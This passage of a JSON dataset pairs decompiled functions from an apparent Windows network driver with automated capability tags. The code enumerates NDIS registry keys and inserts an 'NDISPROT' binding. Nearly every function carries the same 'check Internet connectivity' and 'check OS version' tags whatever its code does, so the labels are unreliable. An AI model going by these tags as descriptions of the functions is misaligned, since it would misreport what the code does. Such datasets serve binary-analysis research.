        "decompiled_code": "\nulong fcn.00035c0c(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uint auStackX16 [2];\n    uchar auStackX24 [16];\n    \n    auStackX16[0] = arg2;\n    fcn.00031564(0x7b290, auStackX24, 0);\n    iVar1 = fcn.00036bf8(arg1, 1);\n    if ((iVar1 == 0) || (*(iVar1 + 0xc) == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = *(iVar1 + 0x488);\n    }\n    fcn.00031598(0x7b290, auStackX24, 0);\n    if (iVar1 == 0) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        uVar2 = fcn.00035b64(iVar1, auStackX16);\n    }\n    return uVar2;\n}\n",
        "token_count": 232
    },
    "00035c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00035c80(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uchar auStackX16 [24];\n    \n    fcn.00031564(0x7b290, auStackX16, 0);\n    iVar1 = fcn.00036bf8(arg1, 1);\n    if ((iVar1 == 0) || (*(iVar1 + 0xc) == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = *(iVar1 + 0x488);\n    }\n    fcn.00031598(0x7b290, auStackX16, 0);\n    if (iVar1 == 0) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        uVar2 = fcn.00035ab0(iVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 201
    },
    "0003633c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003633c(int64_t *arg1, int64_t **arg2)\n\n{\n    int64_t **ppiVar1;\n    int64_t **ppiVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    uchar auStackX16 [24];\n    \n    *arg2 = NULL;\n    uVar3 = 0xc0000001;\n    fcn.00031564(0x88a90, auStackX16, 1);\n    iVar4 = 0;\n    ppiVar2 = *0x88a88;\n    if (0 < *0x88a80) {\n        do {\n            for (ppiVar1 = *ppiVar2; ppiVar1 != NULL; ppiVar1 = *ppiVar1) {\n                if ((arg1 == ppiVar1[2]) && (*ppiVar1 != NULL)) {\n                    if ((*ppiVar1)[2] != NULL) {\n                        iVar4 = 0;\n                        ppiVar2 = *0x88a88 + 3;\n                        goto code_r0x000363c0;\n                    }\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            ppiVar2 = ppiVar2 + 4;\n        } while (iVar4 < *0x88a80);\n    }\n    goto code_r0x000363e3;\n    while( true ) {\n        iVar4 = iVar4 + 1;\n        ppiVar2 = ppiVar2 + 4;\n        if (*0x88a80 <= iVar4) break;\ncode_r0x000363c0:\n        if (*ppiVar2 == (*ppiVar1)[2]) {\n            uVar3 = 0;\n            *arg2 = (*0x88a88)[iVar4 * 4 + 1];\n            break;\n        }\n    }\ncode_r0x000363e3:\n    fcn.00031598(0x88a90, auStackX16, 1);\n    return uVar3;\n}\n",
        "token_count": 443
    },
    "00036cd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00036cd4(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint32_t uStackX8;\n    uint32_t auStackX16 [2];\n    int64_t iStackX24;\n    uchar auStackX32 [8];\n    ulong uStack88;\n    uchar auStack80 [8];\n    ulong uStack72;\n    \n    uStack88 = 0;\n    iVar3 = fcn.000217f8(0xfffffffe, 0x73, auStackX16, &iStackX24);\n    if (iVar3 == 0) {\n        uVar4 = (**0x11128)(iStackX24);\n        uStack72 = uVar4;\n        (**0x11120)();\n        uVar8 = 0;\n        if (auStackX16[0] != 0) {\n            iVar7 = 0;\n            do {\n                uVar1 = *(iVar7 + 0xc + iStackX24);\n                if ((uVar1 == 0) || (*0x7b288 < uVar1)) {\n                    fcn.0002191c(*(iVar7 + iStackX24), *(iVar7 + 8 + iStackX24), *(iVar7 + 4 + iStackX24));\n                }\n                else {\n                    fcn.00031564(0x7b290, auStackX32, 0);\n                    iVar5 = fcn.00036bf8(uVar8, 1);\n                    if (iVar5 == 0) {\n                        fcn.00031598(0x7b290, auStackX32, 0);\n                    }\n                    else if ((*(iVar7 + 0x14 + iStackX24) == *(iVar5 + 0x14)) &&\n                            (*(iVar7 + 0x18 + iStackX24) == *(iVar5 + 0x18))) {\n                        uVar1 = *(iVar7 + 0x10 + iStackX24);\n                        uVar2 = *(iVar5 + 0x430);\n                        fcn.00031598(0x7b290, auStackX32, 0);\n                        if (uVar1 != uVar2) {\n                            if (*(iVar5 + 0xc) == 0) {\n                                fcn.00044fdc(uVar8, uVar1);\n                            }\n                            else {\n                                fcn.00035c0c(uVar8, uVar1);\n                            }\n                        }\n                        uVar1 = *(iVar7 + 0x30 + iStackX24);\n                        if (uVar1 == 0) {\n                            iVar5 = 0;\n                            uStackX8 = 0;\ncode_r0x00036f12:\n                            fcn.00031564(0x7b290, auStackX32, 0);\n                            iVar6 = fcn.00036bf8(uVar8, 1);\n                            if (iVar6 != 0) {\n                                fcn.00031564(iVar6 + 0x438, auStack80, 1);\n                                uStack88 = *(iVar6 + 0x420);\n                                *(iVar6 + 0x420) = iVar5;\n                                *(iVar6 + 0x428) = uStackX8;\n                                fcn.00031598(iVar6 + 0x438, auStack80, 1);\n                            }\n                            fcn.00031598(0x7b290, auStackX32, 0);\n                            fcn.0002fc50(uStack88);\n                        }\n                        else {\n                            iVar5 = fcn.0002fbf0(uVar1);\n                            if (iVar5 != 0) {\n                                iVar3 = fcn.000218cc(*(iVar7 + iStackX24), *(iVar7 + 8 + iStackX24), \n                                                     *(iVar7 + 4 + iStackX24), 0);\n                                if (iVar3 == 0) {\n                                    if ((uStackX8 & 7) == 0) {\n                                        uStackX8 = uStackX8 >> 3;\n                                        iVar3 = fcn.00053868(iVar5, uStackX8);\n                                        if (iVar3 != 0) goto code_r0x00036f12;\n                                        fcn.0002191c(*(iVar7 + iStackX24), *(iVar7 + 8 + iStackX24), \n                                                     *(iVar7 + 4 + iStackX24));\n                                        fcn.0002fc50(iVar5);\n                                    }\n                                    else {\n                                        fcn.0002191c(*(iVar7 + iStackX24), *(iVar7 + 8 + iStackX24), \n                                                     *(iVar7 + 4 + iStackX24));\n                                        fcn.0002fc50(iVar5);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        fcn.00031598(0x7b290, auStackX32, 0);\n                        fcn.0002191c(*(iVar7 + iStackX24), *(iVar7 + 8 + iStackX24), *(iVar7 + 4 + iStackX24));\n                    }\n                }\n                uVar8 = uVar8 + 1;\n                iVar7 = iVar7 + 0x40;\n            } while (uVar8 < auStackX16[0]);\n        }\n        (**0x11118)(uVar4);\n        (**0x11110)(uVar4);\n        fcn.0001a254(iStackX24);\n    }\n    return;\n}\n",
        "token_count": 1248
    },
    "00037b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00037b10(ulong arg1, ulong arg2, uint *arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iStackX32;\n    uint64_t *in_stack_00000028;\n    ulong uStack120;\n    uchar auStack112 [16];\n    uchar auStack96 [16];\n    uint auStack80 [2];\n    ulong uStack72;\n    uchar *puStack64;\n    uint uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    \n    uStack120 = 0;\n    iStackX32 = 0;\n    *arg4 = 0;\n    fcn.000619f0(auStack112, arg1);\n    puStack64 = auStack112;\n    auStack80[0] = 0x30;\n    uStack72 = 0;\n    uStack56 = 0x140;\n    uStack48 = 0;\n    uStack40 = 0;\n    uVar2 = fcn.000619ea(&uStack120, 1, auStack80);\n    if (uVar2 == 0) {\n        fcn.000619f0(auStack96, arg2);\n        uVar1 = fcn.0002f654(uStack120, auStack96, 2, &iStackX32);\n        uVar2 = uVar1;\n        fcn.000619de();\n        if (uVar1 == 0) {\n            if (((*(iStackX32 + 4) == 1) || (*(iStackX32 + 4) == 7)) || (*(iStackX32 + 4) == 2)) {\n                iVar3 = fcn.0002fbc4(*(iStackX32 + 8) + 2);\n                *arg4 = iVar3;\n                if (iVar3 == 0) {\n                    uVar2 = 0xc000009a;\n                }\n                else {\n                    fcn.00061a56(iVar3, 0, *(iStackX32 + 8) + 2);\n                    fcn.000619f6(*arg4, iStackX32 + 0xc, *(iStackX32 + 8));\n                    *arg3 = *(iStackX32 + 4);\n                    *in_stack_00000028 = *(iStackX32 + 8);\n                }\n            }\n            else {\n                uVar2 = 0xc0000001;\n            }\n        }\n        fcn.0002fc50(iStackX32);\n    }\n    return uVar2;\n}\n",
        "token_count": 583
    },
    "00037fdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.00037fdc(char *arg1, uint64_t arg2, char *arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int64_t iVar5;\n    \n    if ((arg4 != 0) && (arg4 <= arg2)) {\n        if (arg2 == arg4) {\n            iVar3 = fcn.00061a80(arg1, arg3, arg2, 1, 1);\n            if (iVar3 != 0) {\n                return NULL;\n            }\n            return arg1;\n        }\n        if (arg4 == 1) {\n            pcVar4 = fcn.00061bb8(arg1, *arg3, arg2);\n            return pcVar4;\n        }\n        cVar1 = *arg3;\n        cVar2 = arg3[arg4 - 1];\n        for (iVar5 = (arg2 - arg4) + 1; iVar5 != 0; iVar5 = iVar5 + -1) {\n            if ((*arg1 == cVar1) && (arg1[arg4 - 1] == cVar2)) {\n                if (arg4 == 2) {\n                    return arg1;\n                }\n                iVar3 = fcn.00061a80(arg1 + 1, arg3 + 1, arg4 - 2, 1, 1);\n                if (iVar3 == 0) {\n                    return arg1;\n                }\n            }\n            arg1 = arg1 + 1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 354
    },
    "000380b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000380b0(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    bool bVar4;\n    uchar uStack40;\n    uchar uStack39;\n    ushort uStack38;\n    uchar uStack36;\n    uchar uStack35;\n    ushort uStack34;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar2 = fcn.0002f718();\n    if (iVar2 < 0x1b) {\n        uVar3 = 0x21590001;\n    }\n    else {\n        LOCK();\n        bVar4 = *0x7b2f0 == 0;\n        *0x7b2f0 = *0x7b2f0 ^ bVar4 * (*0x7b2f0 ^ 1);\n        if (bVar4) {\n            uVar1 = (**0x11080)();\n            uVar3 = fcn.00031ec4();\n            if (((uVar3 == 0) && (uVar3 = fcn.00039284(*0x79c90),  uVar3 == 0)) &&\n               (uVar3 = fcn.0003ad58(*0x79c90),  uVar3 == 0)) {\n                if ((0x13 < uVar1) && (uVar3 = fcn.0003b398(*0x79c90),  uVar3 != 0)) {\n                    return uVar3;\n                }\n                uVar3 = fcn.0004427c();\n                if (uVar3 == 0) {\n                    if (*0x7b2e8 == 0) {\n                        uStack40 = 0x80;\n                        uStack39 = 1;\n                        uStack38 = 0x10;\n                        uStack36 = uVar3;\n                        uStack34 = 0x10;\n                        uStack32 = 0x6f6e624c;\n                        uStack35 = 1;\n                        uStack28 = 0x640;\n                        *0x7b2e8 = (**0x7b000)(*0x7b270, &uStack40);\n                    }\n                    uVar3 = fcn.00034948();\n                    if (((uVar3 == 0) && (uVar3 = fcn.000366ac(),  uVar3 == 0)) &&\n                       ((uVar3 = fcn.0003625c(),  uVar3 == 0 &&\n                        ((uVar3 = fcn.0003978c(*0x79c90),  uVar3 == 0 && (uVar3 = fcn.00032c7c(*0x79c90),  uVar3 == 0)))\n                        ))) {\n                        uVar3 = fcn.00033bd8(*0x79c90);\n                    }\n                }\n            }\n        }\n        else {\n            uVar3 = 0x21590006;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 659
    },
    "0003824c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0003824c(void)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t *arg1;\n    ulong arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piStackX8;\n    ulong auStackX16 [3];\n    \n    piStackX8 = NULL;\n    iVar3 = fcn.00037cc0(L\"\\\\Registry\\\\Machine\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\NetworkCards\", 0, \n                         &piStackX8);\n    arg1 = piStackX8;\n    if (iVar3 == 0) {\n        iVar4 = 0;\n        iVar2 = *piStackX8;\n        piVar1 = piStackX8;\n        while (iVar2 != 0) {\n            iVar3 = fcn.00037b10(*piVar1, 0x149b0, &piStackX8, auStackX16);\n            arg1_00 = auStackX16[0];\n            if (iVar3 == 0) {\n                if (((piStackX8 == 1) && (iVar3 = fcn.00061a68(auStackX16[0], 0x149a0, 7),  iVar3 != 0)) &&\n                   (iVar3 = fcn.00061a68(arg1_00, 0x14988, 8),  iVar3 != 0)) {\n                    fcn.00036864(arg1_00);\n                }\n                fcn.0002fc50(arg1_00);\n            }\n            iVar4 = iVar4 + 1;\n            piVar1 = arg1 + iVar4;\n            iVar2 = *piVar1;\n        }\n        iVar3 = 0;\n    }\n    fcn.00037c84(arg1);\n    return iVar3;\n}\n",
        "token_count": 422
    },
    "00038330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00038330(ulong arg1, int16_t *arg2)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    int64_t *arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t arg3;\n    uint64_t uVar5;\n    int16_t *piVar6;\n    int64_t arg1_01;\n    int64_t iVar7;\n    int32_t iVar8;\n    int64_t *piStackX24;\n    ulong uStackX32;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    iVar3 = fcn.00037cc0(L\"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n                         , 0x149f0, &piStackX24);\n    arg1_00 = piStackX24;\n    if (iVar3 != 0) goto code_r0x00038561;\n    iVar7 = 0;\n    iVar8 = 0;\n    iVar4 = *piStackX24;\n    piVar1 = piStackX24;\n    while (iVar4 != 0) {\n        uStackX32 = 0;\n        iStack64 = 0;\n        iVar3 = fcn.00037b10(*piVar1, 0x149e0, &piStackX24, &uStackX32);\n        if (iVar3 == 0) {\n            iVar4 = fcn.00061bbe(uStackX32, arg1);\n            if ((iVar4 != 0) &&\n               (iVar3 = fcn.00037b10(*piVar1, 0x149c8, &piStackX24, &iStack64),  iVar4 = iStack64,  iVar3 == 0)) {\n                uVar5 = 0xffffffffffffffff;\n                piVar6 = arg2;\n                goto code_r0x0003844a;\n            }\n            fcn.0002fc50(uStackX32);\n        }\n        iVar7 = iVar7 + 1;\n        iVar8 = iVar8 + 1;\n        piVar1 = arg1_00 + iVar7;\n        iVar4 = *piVar1;\n    }\n    goto code_r0x00038551;\n    while( true ) {\n        uVar5 = uVar5 - 1;\n        iVar2 = *piVar6;\n        piVar6 = piVar6 + 1;\n        if (iVar2 == 0) break;\ncode_r0x0003844a:\n        if (uVar5 == 0) break;\n    }\n    iVar7 = fcn.00037fdc(iStack64, iStack72, arg2, ~uVar5 - 1);\n    if (iVar7 == 0) {\n        fcn.0002fc50(uStackX32);\n        fcn.0002fc50(iVar4);\n        iVar3 = 0;\n    }\n    else {\n        uVar5 = 0xffffffffffffffff;\n        do {\n            if (uVar5 == 0) break;\n            uVar5 = uVar5 - 1;\n            iVar2 = *arg2;\n            arg2 = arg2 + 1;\n        } while (iVar2 != 0);\n        piStackX24 = (~uVar5 - 1) * 2 + 2 + iVar7;\n        arg1_01 = iStack72 + (~uVar5 - 1) * -2 + -2;\n        arg3 = fcn.0002fbc4(arg1_01);\n        if (arg3 == 0) {\n            iVar3 = -0x3fffff66;\n            fcn.0002fc50(uStackX32);\n            arg3 = iVar4;\n        }\n        else {\n            fcn.00061a56(arg3, 0, arg1_01);\n            fcn.000619f6(arg3, iVar4, iVar7 - iVar4);\n            fcn.000619f6((iVar7 - iVar4) + arg3, piStackX24, iVar4 + (iStack72 - piStackX24));\n            iVar3 = fcn.00037a4c(arg1_00[iVar8], 0x149c8, arg3, arg1_01);\n            fcn.0002fc50(uStackX32);\n            fcn.0002fc50(iVar4);\n        }\n        fcn.0002fc50(arg3);\n    }\ncode_r0x00038551:\n    if (arg1_00[iVar8] == 0) {\n        iVar3 = -0x3fffffff;\n    }\ncode_r0x00038561:\n    fcn.00037c84(arg1_00);\n    return iVar3;\n}\n",
        "token_count": 1063
    },
    "0003857c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003857c(ulong arg1, int16_t *arg2)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    int64_t *arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int16_t *piVar7;\n    int64_t iVar8;\n    int32_t iVar9;\n    int64_t *piStackX24;\n    ulong uStackX32;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    iVar3 = fcn.00037cc0(L\"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n                         , 0x149f0, &piStackX24);\n    arg1_00 = piStackX24;\n    if (iVar3 != 0) goto code_r0x0003878f;\n    iVar8 = 0;\n    iVar9 = 0;\n    iVar4 = *piStackX24;\n    piVar1 = piStackX24;\n    while (iVar4 != 0) {\n        uStackX32 = 0;\n        iStack64 = 0;\n        iVar3 = fcn.00037b10(*piVar1, 0x149e0, &piStackX24, &uStackX32);\n        if (iVar3 == 0) {\n            iVar4 = fcn.00061bbe(uStackX32, arg1);\n            if ((iVar4 != 0) &&\n               (iVar3 = fcn.00037b10(*piVar1, 0x149c8, &piStackX24, &iStack64),  iVar4 = iStack64,  iVar3 == 0)) {\n                uVar6 = 0xffffffffffffffff;\n                uVar5 = uVar6;\n                piVar7 = arg2;\n                goto code_r0x0003869c;\n            }\n            fcn.0002fc50(uStackX32);\n        }\n        iVar8 = iVar8 + 1;\n        iVar9 = iVar9 + 1;\n        piVar1 = arg1_00 + iVar8;\n        iVar4 = *piVar1;\n    }\n    goto code_r0x0003877f;\n    while( true ) {\n        uVar5 = uVar5 - 1;\n        iVar2 = *piVar7;\n        piVar7 = piVar7 + 1;\n        if (iVar2 == 0) break;\ncode_r0x0003869c:\n        if (uVar5 == 0) break;\n    }\n    iVar8 = fcn.00037fdc(iStack64, iStack72, arg2, ~uVar5 * 2 + -2);\n    piVar7 = arg2;\n    if (iVar8 == 0) {\n        do {\n            if (uVar6 == 0) break;\n            uVar6 = uVar6 - 1;\n            iVar2 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar2 != 0);\n        piVar1 = iStack72 + ~uVar6 * 2;\n        piStackX24 = piVar1;\n        iVar8 = fcn.0002fbc4(piVar1);\n        if (iVar8 == 0) {\n            iVar3 = -0x3fffff66;\n            goto code_r0x000386b6;\n        }\n        fcn.00061a56(iVar8, 0, piVar1);\n        fcn.000619f6(iVar8, iVar4, iStack72);\n        uVar6 = 0xffffffffffffffff;\n        piVar7 = arg2;\n        do {\n            if (uVar6 == 0) break;\n            uVar6 = uVar6 - 1;\n            iVar2 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar2 != 0);\n        fcn.000619f6(iStack72 + -2 + iVar8, arg2, (~uVar6 - 1) * 2);\n        iVar3 = fcn.00037a4c(arg1_00[iVar9], 0x149c8, iVar8, piStackX24);\n        fcn.0002fc50(uStackX32);\n        fcn.0002fc50(iVar4);\n    }\n    else {\n        iVar3 = 0;\ncode_r0x000386b6:\n        fcn.0002fc50(uStackX32);\n        iVar8 = iVar4;\n    }\n    fcn.0002fc50(iVar8);\ncode_r0x0003877f:\n    if (arg1_00[iVar9] == 0) {\n        iVar3 = -0x3fffffff;\n    }\ncode_r0x0003878f:\n    fcn.00037c84(arg1_00);\n    return iVar3;\n}\n",
        "token_count": 1112
    },
    "00038894": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00038894(uint *arg1)\n\n{\n    int64_t *piVar1;\n    char16_t cVar2;\n    int64_t *arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint64_t arg1_01;\n    char16_t *pcVar8;\n    bool bVar9;\n    uchar auStackX8 [8];\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    int64_t *apiStack600 [2];\n    uchar auStack584 [528];\n    \n    *arg1 = 0;\n    arg1_01 = 0;\ncode_r0x000388b1:\n    iVar3 = fcn.00036c58(arg1_01, auStack584, 0x104);\n    if (iVar3 == 0) {\n        bVar9 = false;\n        iVar3 = fcn.00037cc0(L\"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n                             , 0x149f0, apiStack600);\n        arg1_00 = apiStack600[0];\n        if (iVar3 == 0) {\n            iVar6 = 0;\n            iVar4 = *apiStack600[0];\n            piVar1 = apiStack600[0];\n            while (iVar4 != 0) {\n                uStackX16 = 0;\n                uStackX24 = 0;\n                iVar3 = fcn.00037b10(*piVar1, 0x149e0, auStackX8, &uStackX16);\n                if (iVar3 == 0) {\n                    iVar4 = fcn.00061bbe(uStackX16, auStack584);\n                    if ((iVar4 != 0) && (iVar3 = fcn.00037b10(*piVar1, 0x149c8, auStackX8, &uStackX24),  iVar3 == 0)) {\n                        uVar5 = 0xffffffffffffffff;\n                        pcVar8 = L\"NDISPROT\";\n                        goto code_r0x000389cc;\n                    }\n                    fcn.0002fc50(uStackX16);\n                }\n                iVar6 = iVar6 + 1;\n                piVar1 = arg1_00 + iVar6;\n                iVar4 = *piVar1;\n            }\n            goto code_r0x00038a07;\n        }\n        goto code_r0x00038a14;\n    }\n    goto code_r0x00038a3d;\n    while( true ) {\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        if (cVar2 == L'\\0') break;\ncode_r0x000389cc:\n        if (uVar5 == 0) break;\n    }\n    iVar4 = fcn.00037fdc(uStackX24, uStackX32, L\"NDISPROT\", ~uVar5 * 2 + -2);\n    bVar9 = iVar4 != 0;\n    iVar3 = 0;\n    fcn.0002fc50(uStackX16);\n    fcn.0002fc50(uStackX24);\ncode_r0x00038a07:\n    if (arg1_00[iVar6] == 0) {\n        iVar3 = -0x3fffffff;\n    }\ncode_r0x00038a14:\n    fcn.00037c84(arg1_00);\n    if ((iVar3 == 0) && (!bVar9)) {\n        *arg1 = 1;\n        fcn.0003857c(auStack584, L\"NDISPROT\");\n    }\ncode_r0x00038a3d:\n    uVar7 = arg1_01 + 1;\n    arg1_01 = uVar7;\n    if (99 < uVar7) {\n        return;\n    }\n    goto code_r0x000388b1;\n}\n",
        "token_count": 920
    },
    "00038be0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00038be0(ulong arg1, ulong arg2, uchar *arg3, int64_t *arg4)\n\n{\n    ulong uVar1;\n    ulong in_stack_00000028;\n    \n    (**0x11070)(arg4, arg1, arg2, 0);\n    if (*arg4 == 0) {\n        uVar1 = 0xc0000001;\n    }\n    else {\n        fcn.00061b2e(arg3, 0xf0);\n        *(arg3 + 8) = 0x38bcc;\n        *arg3 = 5;\n        *(arg3 + 0x20) = 0x38bbc;\n        arg3[1] = 1;\n        *(arg3 + 0x30) = 0x38b98;\n        *(arg3 + 0x10) = 0;\n        *(arg3 + 0x40) = 0x38b78;\n        *(arg3 + 0x18) = 0;\n        *(arg3 + 0x50) = 0x38b60;\n        *(arg3 + 0x70) = 0x38b48;\n        *(arg3 + 0x78) = 0x38b2c;\n        *(arg3 + 0x58) = 0x38b10;\n        *(arg3 + 0x60) = 0x38af0;\n        *(arg3 + 0x80) = 0x38ad0;\n        *(arg3 + 0x28) = 0x38ac0;\n        *(arg3 + 0x38) = 0x38aa4;\n        *(arg3 + 0xb8) = 0x38a8c;\n        *(arg3 + 0xc0) = 0x38a6c;\n        *(arg3 + 200) = 0x38a5c;\n        uVar1 = (**0x11078)(*arg4, arg3, 0xf0, in_stack_00000028);\n    }\n    return uVar1;\n}\n",
        "token_count": 462
    },
    "00039284": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00039284(ulong arg1)\n\n{\n    ulong uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t arg1_00;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    ulong var_28h;\n    uchar auStack648 [16];\n    uchar uStack632;\n    uchar uStack631;\n    ulong uStack624;\n    ulong uStack616;\n    ulong uStack608;\n    ulong uStack600;\n    ulong uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    ulong uStack568;\n    ulong uStack552;\n    ulong uStack536;\n    ulong uStack520;\n    ulong uStack512;\n    ulong uStack504;\n    ulong uStack448;\n    ulong uStack440;\n    ulong uStack432;\n    uchar auStack392 [48];\n    int64_t iStack344;\n    \n    fcn.000619f0(auStack648, 0x11fb4);\n    fcn.000619f6(auStack392, arg1, 0x150);\n    uVar1 = *(iStack344 + 0x28);\n    (**0x11070)(0x7b308, arg1, auStack648, 0);\n    if (*0x7b308 == 0) {\n        uVar6 = 0xc0000001;\n    }\n    else {\n        fcn.00061b2e(&uStack632, 0xf0);\n        uStack624 = 0x3911c;\n        uStack600 = 0x39130;\n        uStack584 = 0x39140;\n        uStack632 = 5;\n        uStack568 = 0x39164;\n        uStack631 = 1;\n        uStack552 = 0x39184;\n        uStack616 = 0;\n        uStack520 = 0x3919c;\n        uStack608 = 0;\n        uStack512 = 0x391b4;\n        uStack536 = 0x391d0;\n        uStack504 = 0x391f0;\n        uStack592 = 0x39210;\n        uStack576 = 0x39220;\n        uStack448 = 0x3923c;\n        uStack440 = 0x39254;\n        uStack432 = 0x39274;\n        uVar3 = (**0x11058)(*0x7b308, &uStack632, 0xf0);\n        uVar6 = uVar3;\n        if (uVar3 == 0) {\n            arg1_00 = (*_fcn.00011470)(arg1);\n            if (arg1_00 == 0) {\n                uVar6 = 0xc0000001;\n            }\n            else {\n                do {\n                    iVar5 = uVar6;\n                    iVar7 = uVar6 + arg1_00;\n                    cVar2 = (**0x11468)(iVar7);\n                    if (cVar2 == '\\0') break;\n                    cVar2 = (**0x11468)(iVar7 + 0xf0);\n                    if (cVar2 == '\\0') break;\n                    iVar4 = fcn.00061a80(iVar7, &uStack632, 0xf0, 1, 1);\n                    if (iVar4 == 0) goto code_r0x00039475;\n                    uVar6 = iVar5 + 1U;\n                